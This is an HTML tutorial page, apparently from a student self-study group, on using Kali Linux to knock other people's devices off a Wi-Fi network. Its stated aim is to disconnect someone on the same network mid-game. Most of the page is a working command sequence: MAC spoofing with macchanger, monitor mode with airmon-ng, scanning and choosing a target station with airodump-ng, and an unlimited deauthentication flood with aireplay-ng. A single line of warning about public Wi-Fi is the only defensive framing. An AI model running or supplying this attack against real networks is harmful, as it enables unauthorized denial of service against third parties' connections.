@@ -1,0 +1,120 @@
+<html>
+<head>
+<title>Kali安全滲透-強制斷線</title>
+<link rel=stylesheet type="text/css" href="kali.css">
+<canvas id="cw"></canvas>
+<script type="text/javascript" src="Mouse_F.js"></script>
+</head>
+<body>
+<div id=main>
+<header>
+	<h1> Kali 安全滲透</h1> 
+</header>
+<aside>
+	<nav>
+	<img src="kali-linux-logo-.jpg" width="170">
+	<ul>
+	<li style="font-size:14pt;"><a href="Kali-home.htm">首頁</a></li>
+	<li style="list-style:circle"><h6>學習操作</h6></li>
+	<li><a href="Kali-passwd.htm">破解密碼</a></li>
+	<li><a href="Kali-disconnection.htm">強制斷線</a></li>
+	<li><a href="Kali-evilPDF.htm">PDF監聽文件-1</a></li>
+	<li><a href="Kali-evilPDF_2.htm">PDF監聽文件-2</a></li>
+	<li><a href="Kali-evilWeb.htm">Web監聽網頁</a></li>
+	<li style="list-style:circle"><h6>前置作業</h6></li>
+	<li><a href="">製作開機USB</a></li>
+	<li><a href="Kali-Group.htm">社群介紹</a></li>
+	</ul>
+	</nav>
+</aside>
+<article>
+	<section class="consection">
+	<h3>強制斷線</h3>
+<fieldset>
+	<legend style="font-weight:bold; font-size:16pt">本次學習目標</legend>
+	如何讓同網域的人打遊戲打到一半斷線(擷取Handshake握手包攻擊連線者)。</br>
+	</br></br>
+	課程寓意：不要隨意連結公共場域的Wi-Fi網路，以維護自身的資料與電腦的使用。</br>
+</fieldset>
+</section>
+	<p style="text-align:center;">*有標示顏色者為系統輸出</p>
+	<p>首先我們要先更變管理員權限</p>
+	<p class="code" style="color:#52008F	">01 ──(kali㉿kali)-[~]</p>
+	<p class="code">02 └─$ id kali </p>
+	<p style="text-indent: 4em">確認當前權限</p>
+	<p class="code">   uid=1000(kali) gid=1000(kali) groups=1000(kali), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 121(wireshark), 126(bluetooth), 138(scanner), 146(kaboxer)</p>
+	<p style="text-indent: 4em">前面的uid=1000，表示現在為普通用戶，需更改權限到root</p>
+	<p class="code" style="color:#52008F	">03 ──(kali㉿kali)-[~]</p>
+	<p class="code">04 └─$ sudo passwd root </p>
+	<p style="text-indent: 4em">設定密碼</p>
+	<p class="code">   New password: </p>
+	<p class="code">   Retype new password: </p>
+	<p class="code">   passwd: password updated successfully</p>
+	<p class="code" style="color:#52008F	">05 ──(kali㉿kali)-[~]</p>
+	<p class="code">06 └─$ su root </p>
+	<p class="code">   Password:</p>
+	<p class="code" style="color:#B80000">07 ┌──(root㉿kali)-[/home/kali]</p>
+	<p style="text-indent: 4em">看到第7行呈現root㉿kali即成功更變權限</p>
+	<img class="style_Pic" src="Pic/2-1.png" width="780" >
+	<hr/>
+	<p>查看網卡狀況</p>
+	<p class="code">08 └─# ifconfig -a</p>
+	<img class="style_Pic" src="Pic/2-2.png" width="70" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出(涉及電腦情資不截全圖)</li></ul>
+	<hr/>
+	<p class="code" style="color:#B80000">09 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code" >10 # ifconfig wlan0 down</p>
+	<p class="code" style="color:#B80000">11 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">12 # macchanger --mac 00:11:22:33:44:55 wlan0 </p>
+	<img class="style_Pic" src="Pic/2-3.png" width="180" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出(涉及電腦情資不截全圖)</li></ul>
+	<p style="text-indent: 4em">成功更變無線網卡位置</p>
+	<hr/>
+	<p class="code" style="color:#B80000">13 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">14 # airmon-ng check kill </p>
+	<p class="code" style="text-indent: 3em">Killing these processes:</p>
+	<p class="code" style="text-indent: 3em">PID Name</p>
+	<p class="code" style="text-indent: 3em">(編碼) wpa_supplicant</p>
+	<p class="code" style="color:#B80000">15┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">16 # airmon-ng start wlan0</p>
+	<img class="style_Pic" src="2-4.png" width="500" >
+	<p style="text-indent: 4em">成功更變無線網卡為wlan0mon</p>
+	<hr/>
+	<p class="code" style="color:#B80000">17┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">18 # ifconfig wlan0mon up</p>
+	<p class="code" style="color:#B80000">19┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">20 # airodump-ng wlan0mon</p>
+	<img class="style_Pic" src="2-5.png" width="500" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出，顯示你附近的所有Wi-Fi</li></ul>
+	<p style="text-indent: 4em">覺得搜索差不多了，就按ctrl+c結束搜索(會看到"Quitting..."系統字符) </p>
+	<hr/>
+	<p>選擇一個你想破解的網路</p>
+	<p style="text-indent: 4em">這邊選擇No_Wi-Fi_KuKu_O </p>
+	<p style="text-indent: 4em">選擇好後，複製BSSID、CH(網路頻道)、ESSID ，接下來將針對這個網路進行探查(蒐集連線的裝置)。</p>
+	<p class="code" style="color:#B80000">21┌──(root㉿kali)-[/home/kali] </p>
+	<p style="text-indent: 4em">下面語法:airodump-ng -c (CH頻道數字) -w (ESSID網路名稱) --bssid (BSSID網路位置碼)  (網卡名稱)</p>
+	<p class="code">22 └─# airodump-ng -c 6 -w No_Wi-Fi_KuKu_O --bssid AA:65:2B:1F:3E:43 wlan0mon</p>
+	<p style="text-indent: 4em">插曲:這邊我的BSSID與上一個圖不同(沒有截到後面這一個BSSID的畫面) </p>
+	<p style="text-indent: 4em">此網路的連線狀況(有幾個裝置連線)</p>
+	<img class="style_Pic" src="2-6.png" width="600" >
+	<img class="style_Pic" src="2-8.png" width="600" >
+	<p>等個3分鐘蒐集好所有連線/想攻擊的裝置後按ctrl+c(會看到"Quitting..."系統字符)</p>
+	<p style="text-indent: 4em">這邊稍稍麻煩的是，如果連線的裝置很多，你要通靈你想攻擊的裝置(但可以藉著Rate 、Lost判斷裝置的遠近或是上網情況去判斷是不是你想攻擊的裝置)</p>
+	<hr/>
+	<p>複製你想攻擊的裝置的STATION</p>
+	<p class="code" style="color:#B80000">23┌──(root㉿kali)-[/home/kali] </p>
+	<p style="text-indent: 4em">下面語法:aireplay-ng -0 (攻擊次數，0代表無限次) -a (BSSID網路位置碼) -c   (STATION裝置位置碼) (網卡名稱)</p>
+	<p class="code">24 └─# aireplay-ng -0 0 -a AA:65:2B:1F:3E:43 -c 7A:F1:10:02:7E:CF wlan0mon</p>
+	<img class="style_Pic" src="3-1.png" width="600" >
+	<ul><li style="list-style:circle" >看到上述畫面即成功讓對方斷線連不上網路</li></ul>
+	<p>無限攻擊這個裝置直到你按ctrl+c為止</p>
+	<hr/>
+<p>本次學習結束</p>	
+<!--中文註解設計-->
+
+	</section>
+</article>
+<footer>最後更新時間:2022/05/29 製作 110-2自主學習社群 Kali教會我的那些事</footer>
+</div>
+</body>
+</html>
